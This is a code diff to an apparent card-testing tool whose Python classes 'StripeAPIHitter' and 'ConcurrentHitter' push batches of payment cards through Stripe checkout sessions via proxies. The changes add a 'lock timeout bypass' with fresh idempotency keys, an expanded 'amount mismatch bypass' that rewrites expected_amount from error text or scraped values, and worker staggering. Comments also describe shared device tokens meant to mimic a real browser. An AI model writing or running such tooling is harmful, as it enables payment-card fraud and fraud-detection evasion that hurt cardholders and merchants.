@@ -1309,18 +1309,32 @@ class StripeAPIHitter:
                     err_msg = confirm_json.get('error', {}).get('message', '') or ''
                     _param_retries += 1
 
+                # Lock Timeout Bypass — Stripe returns this when concurrent requests hit the same PI
+                # Retry with exponential back-off up to 3 times
+                err_code = confirm_json.get('error', {}).get('code')
+                err_msg = confirm_json.get('error', {}).get('message', '') or ''
+                _lock_retries = 0
+                while _lock_retries < 3 and (err_code == 'lock_timeout' or 'another API request' in err_msg or 'currently accessing it' in err_msg):
+                    _lock_retries += 1
+                    await asyncio.sleep(1.5 * _lock_retries + random.uniform(0.2, 0.8))
+                    confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
+                    confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
+                    confirm_json = confirm_res.json()
+                    err_code = confirm_json.get('error', {}).get('code')
+                    err_msg = confirm_json.get('error', {}).get('message', '') or ''
                 
                 # Unified Amount Mismatch Bypass
                 # Check response.status_code != 200 OR check if error payload returned in response json dict
                 has_amount_mismatch = False
-                if confirm_res.status_code != 200 and (err_code == 'checkout_amount_mismatch' or 'expected amount' in err_msg.lower() or 'expected_amount' in err_msg):
+                _err_lower = err_msg.lower()
+                if confirm_res.status_code != 200 and (err_code == 'checkout_amount_mismatch' or 'expected amount' in _err_lower or 'expected_amount' in err_msg or 'has to be provided' in _err_lower):
                     has_amount_mismatch = True
                 elif confirm_res.status_code == 200:
                     temp_err = confirm_json.get('error', {})
                     if temp_err:
                         temp_code = temp_err.get('code')
                         temp_msg = temp_err.get('message', '') or ''
-                        if temp_code == 'checkout_amount_mismatch' or 'expected amount' in temp_msg.lower() or 'computed invoice' in temp_msg.lower() or 'expected_amount' in temp_msg:
+                        if temp_code == 'checkout_amount_mismatch' or 'expected amount' in temp_msg.lower() or 'computed invoice' in temp_msg.lower() or 'expected_amount' in temp_msg or 'has to be provided' in temp_msg.lower():
                             has_amount_mismatch = True
                             err_code = temp_code
                             err_msg = temp_msg
@@ -1330,8 +1344,15 @@ class StripeAPIHitter:
                     # e.g., "The expected amount (2000) does not match the actual amount (0)."
                     import re
                     match = re.search(r'actual amount \((\d+)\)', err_msg.lower())
+                    if not match:
+                        # Also try: "The expected amount of the confirmation has to be provided."
+                        # In this case use scraped raw_amount, or try 0
+                        match = re.search(r'expected amount \((\d+)\)', err_msg.lower())
                     if match:
                         confirm_data['expected_amount'] = int(match.group(1))
+                    elif self.raw_amount is not None and self.raw_amount > 0:
+                        # Use the scraped amount from payment data init
+                        confirm_data['expected_amount'] = self.raw_amount
                     elif 'subscription' in err_msg.lower() or 'computed invoice' in err_msg.lower() or 'latest invoice' in err_msg.lower():
                         # For subscription checkouts, delete expected_amount to let Stripe confirm the computed invoice automatically
                         if 'expected_amount' in confirm_data:
@@ -1677,6 +1698,7 @@ class ConcurrentHitter:
         self.is_running = True
         self._reusable = any(d in self.url.lower() for d in self.REUSABLE_DOMAINS)
         self._session_lock = asyncio.Lock()  # serialize session fetches to avoid thundering herd
+        self._confirm_lock = asyncio.Lock()  # serialize confirms on non-reusable links to avoid PI lock contention
         # Cached stripe device tokens — mimic __stripe_mid (1yr) and __stripe_sid (30min) persistence
         # All cards in the same session share the same muid/sid/guid, just like a real browser
         self._stripe_tokens: dict = {}
@@ -1874,7 +1896,12 @@ class ConcurrentHitter:
                     hitter = StripeAPIHitter(pk_key, cs_token, proxy_data, raw_amount, locked_email, stripe_account=stripe_account)
                     
                     import random
-                    await asyncio.sleep(random.uniform(0.05, 0.2))  # Micro-random delay per card attempt  
+                    # For non-reusable links, all workers share the same PI — serialize confirms
+                    # to prevent Stripe lock_timeout ("another API request is currently accessing it")
+                    if not self._reusable:
+                        await asyncio.sleep(random.uniform(0.3, 1.0) * (attempt_num - 1))  # Stagger workers
+                    else:
+                        await asyncio.sleep(random.uniform(0.05, 0.2))  # Micro-random delay per card attempt
                     
                     # Reuse session-level stripe tokens — all cards in the batch should carry the same
                     # muid/sid/guid to mimic a real browser's __stripe_mid (1yr) and __stripe_sid (30min)
@@ -1886,7 +1913,12 @@ class ConcurrentHitter:
                     else:
                         session_tokens = self._stripe_tokens
                     
-                    result = await hitter.hit(card, attempt_num, self.user_id, cached_stripe_tokens=session_tokens)
+                    # For non-reusable links, acquire confirm lock to serialize PI access
+                    if not self._reusable:
+                        async with self._confirm_lock:
+                            result = await hitter.hit(card, attempt_num, self.user_id, cached_stripe_tokens=session_tokens)
+                    else:
+                        result = await hitter.hit(card, attempt_num, self.user_id, cached_stripe_tokens=session_tokens)
                     
                     # Cache the tokens returned from first card hit for reuse by all subsequent cards
                     if not session_tokens and isinstance(result, dict) and result.get('_stripe_tokens'):
@@ -1928,10 +1960,14 @@ class ConcurrentHitter:
                     # Retry on resource_missing — session was stale, fetch a new one
                     if decline == 'resource_missing' and self._reusable:
                         should_retry = True
+                    
+                    # Retry on lock_timeout — concurrent PI access, back off and retry
+                    if decline == 'lock_timeout' or 'another API request' in err_str or 'currently accessing' in err_str:
+                        should_retry = True
                             
                     if should_retry:
                         if try_idx < max_retries - 1:
-                            delay = 2.0 * (try_idx + 1)
+                            delay = 2.5 * (try_idx + 1) + random.uniform(0.5, 1.5)
                             await asyncio.sleep(delay)
                             continue
                     break
